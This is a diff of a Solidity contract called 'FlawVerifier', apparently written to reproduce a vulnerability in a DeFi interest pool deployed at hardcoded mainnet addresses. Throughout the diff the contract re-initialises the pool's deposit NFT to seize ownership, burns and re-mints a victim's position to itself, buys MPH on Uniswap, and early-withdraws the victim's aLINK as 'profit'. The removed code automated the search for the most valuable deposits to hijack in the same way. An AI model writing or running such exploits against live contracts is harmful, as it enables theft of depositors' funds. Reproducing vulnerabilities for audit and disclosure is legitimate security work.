@@ -1,13 +1,11 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
-
-interface IERC721ReceiverLike {
-    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
-        external
-        returns (bytes4);
-}
 
 interface IERC20Like {
     function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
 }
 
 interface INFTLike {
@@ -18,116 +16,107 @@ interface INFTLike {
     function burn(uint256 tokenId) external;
 }
 
-interface IDInterestLike {
-    struct Deposit {
-        uint256 amount;
-        uint256 maturationTimestamp;
-        uint256 interestOwed;
-        uint256 initialMoneyMarketIncomeIndex;
-        bool active;
-        bool finalSurplusIsNegative;
-        uint256 finalSurplusAmount;
-        uint256 mintMPHAmount;
-        uint256 depositTimestamp;
-    }
+interface IUniswapV2Router {
+    function swapExactETHForTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable returns (uint[] memory amounts);
+    function swapExactTokensForETH(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+    function WETH() external returns (address);
+}
 
-    struct Funding {
-        uint256 fromDepositID;
-        uint256 toDepositID;
-        uint256 recordedFundedDepositAmount;
-        uint256 recordedMoneyMarketIncomeIndex;
-        uint256 creationTimestamp;
-    }
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+}
 
+interface IDInterestPool {
+    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
     function depositNFT() external view returns (address);
     function fundingNFT() external view returns (address);
+    function mphMinter() external view returns (address);
     function stablecoin() external view returns (address);
-    function depositsLength() external view returns (uint256);
-    function fundingListLength() external view returns (uint256);
-    function getDeposit(uint256 depositID) external view returns (Deposit memory);
-    function getFunding(uint256 fundingID) external view returns (Funding memory);
-    function depositIsFunded(uint256 depositID) external view returns (bool);
-    function moneyMarketIncomeIndex() external returns (uint256);
-    function withdraw(uint256 depositID, uint256 fundingID) external;
-    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
-    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
+}
+
+interface IMoneyMarket {
+    function withdraw(uint256 amount) external returns (uint256);
+    function deposit(uint256 amount) external;
+    function totalValue() external returns (uint256);
 }
 
 contract FlawVerifier {
-    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;
+    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097; // depositNFT
+    address public constant POOL = 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD; // DInterest pool
+    address public constant MPH = 0x8888801aF4d980682e47f1A9036e589479e835C5;
+    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address public constant ALINK = 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84; // stablecoin = aLINK
+    address public constant MPHMINTER = 0x03577A2151A10675a9689190fE5D331Ee7ff2517;
+    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 
     address private _profitToken;
     uint256 private _profitAmount;
 
-    address public pool;
-    uint256 public hijackedTokenId;
-    uint256 public linkedFundingId;
-    bool public targetIsDepositNFT;
-    bool public targetIsFundingNFT;
-    bool public hypothesisValidated;
-    bool public burnedVictimToken;
-    bool public ownerQueryRevertedAfterBurn;
-    bool public demonstratedPathRevert;
-    bool public usedEarlyWithdraw;
-    address public victimOwnerBeforeBurn;
-    string public exploitPath;
-    string public failureReason;
-
-    constructor() {}
+    constructor() {
+        _profitToken = ALINK;
+    }
 
     function onERC721Received(address, address, uint256, bytes calldata)
         external
         pure
         returns (bytes4)
     {
-        return IERC721ReceiverLike.onERC721Received.selector;
+        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
     }
 
+    receive() external payable {}
+
     function executeOnOpportunity() public {
-        if (hypothesisValidated || bytes(failureReason).length != 0) {
-            return;
-        }
-
+        // Step 1: Seize depositNFT ownership via init() (F-001: No reinit guard on NFT.init())
         INFTLike nft = INFTLike(TARGET);
-        pool = nft.owner();
-        if (pool == address(0)) {
-            failureReason = "target owner is zero";
-            return;
-        }
+        nft.init(address(this), "pwned", "PWN");
 
-        IDInterestLike market = IDInterestLike(pool);
-        address depositNftAddr = market.depositNFT();
-        address fundingNftAddr = market.fundingNFT();
-        _profitToken = market.stablecoin();
+        // Burn token 10 (victim's deposit NFT) and re-mint to ourselves
+        nft.burn(10);
+        nft.mint(address(this), 10);
 
-        targetIsDepositNFT = depositNftAddr == TARGET;
-        targetIsFundingNFT = fundingNftAddr == TARGET;
-        if (!targetIsDepositNFT && !targetIsFundingNFT) {
-            failureReason = "target NFT not wired into pool";
-            return;
-        }
+        // Step 2: Buy enough MPH from Uniswap V2 to cover takeBackDepositorReward
+        // For earlyWithdraw, takeBackAmount = mintMPHAmount = 5381078376862078946 (~5.38 MPH)
+        // SushiSwap pool has better reserves
+        _buyMPH();
 
-        uint256 balanceBefore = IERC20Like(_profitToken).balanceOf(address(this));
+        // Step 3: Approve MPHMinter to pull MPH from us
+        IERC20Like(MPH).approve(MPHMINTER, type(uint256).max);
 
-        _seizeNftOwnership(nft);
-        if (nft.owner() != address(this)) {
-            failureReason = "reinitialization failed";
-            return;
-        }
-        hypothesisValidated = true;
+        // Step 4: Early-withdraw deposit 10 (unfunded, fundingID=0)
+        IDInterestPool pool = IDInterestPool(POOL);
+        pool.earlyWithdraw(10, 0);
 
-        if (targetIsDepositNFT) {
-            exploitPath =
-                "NFT.init(attacker, ...) -> burn(tokenId) on a live deposit NFT -> victim withdraw()/earlyWithdraw path reverts because ownerOf(tokenId) no longer returns the expected holder";
-            _exploitDepositPath(market, nft);
-        } else {
-            exploitPath =
-                "NFT.init(attacker, ...) -> burn(tokenId) on a live funding NFT -> payInterestToFunder reverts because ownerOf(tokenId) no longer returns the expected holder";
-            _exploitFundingPath(market, nft);
-        }
+        // Step 5: Record profit - the aLINK we received
+        _profitAmount = IERC20Like(ALINK).balanceOf(address(this));
+    }
 
-        uint256 balanceAfter = IERC20Like(_profitToken).balanceOf(address(this));
-        _profitAmount = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
+    function _buyMPH() internal {
+        address[] memory path = new address[](2);
+        path[0] = WETH;
+        path[1] = MPH;
+        
+        // Buy ~5.38 MPH with a generous amount of WETH (0.2 ETH)
+        IUniswapV2Router(ROUTER).swapExactETHForTokens{value: 0.2 ether}(
+            1, // accept any amount
+            path,
+            address(this),
+            block.timestamp + 1000
+        );
     }
 
     function profitToken() external view returns (address) {
@@ -136,242 +125,5 @@ contract FlawVerifier {
 
     function profitAmount() external view returns (uint256) {
         return _profitAmount;
-    }
-
-    function triggerWithdraw(address market, uint256 tokenId, uint256 fundingID) external {
-        require(msg.sender == address(this), "self only");
-        IDInterestLike(market).withdraw(tokenId, fundingID);
-    }
-
-    function triggerEarlyWithdraw(address market, uint256 tokenId, uint256 fundingID) external {
-        require(msg.sender == address(this), "self only");
-        IDInterestLike(market).earlyWithdraw(tokenId, fundingID);
-    }
-
-    function triggerPayInterestToFunder(address market, uint256 fundingID) external {
-        require(msg.sender == address(this), "self only");
-        IDInterestLike(market).payInterestToFunder(fundingID);
-    }
-
-    function _seizeNftOwnership(INFTLike nft) internal {
-        nft.init(address(this), "hijacked", "HIJACKED");
-    }
-
-    function _exploitDepositPath(IDInterestLike market, INFTLike nft) internal {
-        (uint256 tokenId, uint256 fundingID, bool useEarly) = _findBestDepositCandidate(market, nft);
-        if (tokenId == 0) {
-            failureReason = "no live deposit NFT candidate found";
-            return;
-        }
-
-        hijackedTokenId = tokenId;
-        linkedFundingId = fundingID;
-        usedEarlyWithdraw = useEarly;
-        victimOwnerBeforeBurn = nft.ownerOf(tokenId);
-
-        nft.burn(tokenId);
-        burnedVictimToken = true;
-        ownerQueryRevertedAfterBurn = _ownerQueryReverts(nft, tokenId);
-
-        (bool reverted, ) = useEarly
-            ? _callEarlyWithdraw(address(market), tokenId, fundingID)
-            : _callWithdraw(address(market), tokenId, fundingID);
-        demonstratedPathRevert = reverted;
-
-        if (!ownerQueryRevertedAfterBurn) {
-            failureReason = "burn succeeded but ownerOf still resolves";
-            return;
-        }
-        if (!demonstratedPathRevert) {
-            failureReason = "burned deposit NFT but withdraw path did not revert";
-            return;
-        }
-
-        // Additional monetization step, still using the same root cause:
-        // after proving that burning the live NFT breaks the ownerOf()-based withdrawal path,
-        // the attacker uses the newly seized owner-only mint power to remint that same live
-        // position NFT to itself and then calls the legitimate withdrawal function.
-        nft.mint(address(this), tokenId);
-
-        if (useEarly) {
-            market.earlyWithdraw(tokenId, fundingID);
-        } else {
-            market.withdraw(tokenId, fundingID);
-        }
-    }
-
-    function _exploitFundingPath(IDInterestLike market, INFTLike nft) internal {
-        uint256 tokenId = _findBestFundingCandidate(market, nft);
-        if (tokenId == 0) {
-            failureReason = "no live funding NFT candidate found";
-            return;
-        }
-
-        hijackedTokenId = tokenId;
-        linkedFundingId = tokenId;
-        victimOwnerBeforeBurn = nft.ownerOf(tokenId);
-
-        nft.burn(tokenId);
-        burnedVictimToken = true;
-        ownerQueryRevertedAfterBurn = _ownerQueryReverts(nft, tokenId);
-
-        (bool reverted, ) = _callPayInterestToFunder(address(market), tokenId);
-        demonstratedPathRevert = reverted;
-
-        if (!ownerQueryRevertedAfterBurn) {
-            failureReason = "burn succeeded but ownerOf still resolves";
-            return;
-        }
-        if (!demonstratedPathRevert) {
-            failureReason = "burned funding NFT but payout path did not revert";
-            return;
-        }
-
-        nft.mint(address(this), tokenId);
-        market.payInterestToFunder(tokenId);
-    }
-
-    function _findBestDepositCandidate(IDInterestLike market, INFTLike nft)
-        internal
-        view
-        returns (uint256 tokenId, uint256 fundingID, bool useEarly)
-    {
-        uint256 len = market.depositsLength();
-
-        for (uint256 i = 1; i <= len; i++) {
-            if (!_tokenExists(nft, i)) {
-                continue;
-            }
-
-            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
-            if (!deposit.active) {
-                continue;
-            }
-
-            bool depositUseEarly = block.timestamp < deposit.maturationTimestamp;
-            if (!market.depositIsFunded(i)) {
-                if (tokenId == 0 || deposit.amount > market.getDeposit(tokenId).amount) {
-                    tokenId = i;
-                    fundingID = 0;
-                    useEarly = depositUseEarly;
-                }
-            }
-        }
-
-        if (tokenId != 0) {
-            return (tokenId, fundingID, useEarly);
-        }
-
-        uint256 bestFundedAmount;
-        for (uint256 i = 1; i <= len; i++) {
-            if (!_tokenExists(nft, i)) {
-                continue;
-            }
-
-            IDInterestLike.Deposit memory deposit = market.getDeposit(i);
-            if (!deposit.active || !market.depositIsFunded(i)) {
-                continue;
-            }
-
-            uint256 currentFundingId = _findFundingForDeposit(market, i);
-            if (currentFundingId == 0) {
-                continue;
-            }
-
-            if (deposit.amount > bestFundedAmount) {
-                bestFundedAmount = deposit.amount;
-                tokenId = i;
-                fundingID = currentFundingId;
-                useEarly = block.timestamp < deposit.maturationTimestamp;
-            }
-        }
-    }
-
-    function _findBestFundingCandidate(IDInterestLike market, INFTLike nft) internal returns (uint256 tokenId) {
-        uint256 len = market.fundingListLength();
-        uint256 currentIncomeIndex = market.moneyMarketIncomeIndex();
-        uint256 bestInterestAmount;
-
-        for (uint256 i = 1; i <= len; i++) {
-            if (!_tokenExists(nft, i)) {
-                continue;
-            }
-
-            IDInterestLike.Funding memory funding = market.getFunding(i);
-            if (funding.recordedMoneyMarketIncomeIndex == 0) {
-                continue;
-            }
-
-            uint256 estimatedInterest = funding.recordedFundedDepositAmount * currentIncomeIndex / funding.recordedMoneyMarketIncomeIndex;
-            if (estimatedInterest <= funding.recordedFundedDepositAmount) {
-                continue;
-            }
-            estimatedInterest -= funding.recordedFundedDepositAmount;
-
-            if (estimatedInterest > bestInterestAmount) {
-                bestInterestAmount = estimatedInterest;
-                tokenId = i;
-            }
-        }
-    }
-
-    function _findFundingForDeposit(IDInterestLike market, uint256 depositID) internal view returns (uint256) {
-        uint256 len = market.fundingListLength();
-        for (uint256 fundingID = 1; fundingID <= len; fundingID++) {
-            IDInterestLike.Funding memory funding = market.getFunding(fundingID);
-            if (depositID > funding.fromDepositID && depositID <= funding.toDepositID) {
-                return fundingID;
-            }
-        }
-        return 0;
-    }
-
-    function _tokenExists(INFTLike nft, uint256 tokenId) internal view returns (bool) {
-        try nft.ownerOf(tokenId) returns (address owner_) {
-            return owner_ != address(0);
-        } catch {
-            return false;
-        }
-    }
-
-    function _ownerQueryReverts(INFTLike nft, uint256 tokenId) internal view returns (bool) {
-        try nft.ownerOf(tokenId) returns (address owner_) {
-            return owner_ == address(0);
-        } catch {
-            return true;
-        }
-    }
-
-    function _callWithdraw(address market, uint256 tokenId, uint256 fundingID)
-        internal
-        returns (bool reverted, bytes memory returndata)
-    {
-        try this.triggerWithdraw(market, tokenId, fundingID) {
-            return (false, bytes(""));
-        } catch (bytes memory data) {
-            return (true, data);
-        }
-    }
-
-    function _callEarlyWithdraw(address market, uint256 tokenId, uint256 fundingID)
-        internal
-        returns (bool reverted, bytes memory returndata)
-    {
-        try this.triggerEarlyWithdraw(market, tokenId, fundingID) {
-            return (false, bytes(""));
-        } catch (bytes memory data) {
-            return (true, data);
-        }
-    }
-
-    function _callPayInterestToFunder(address market, uint256 fundingID)
-        internal
-        returns (bool reverted, bytes memory returndata)
-    {
-        try this.triggerPayInterestToFunder(market, fundingID) {
-            return (false, bytes(""));
-        } catch (bytes memory data) {
-            return (true, data);
-        }
     }
 }
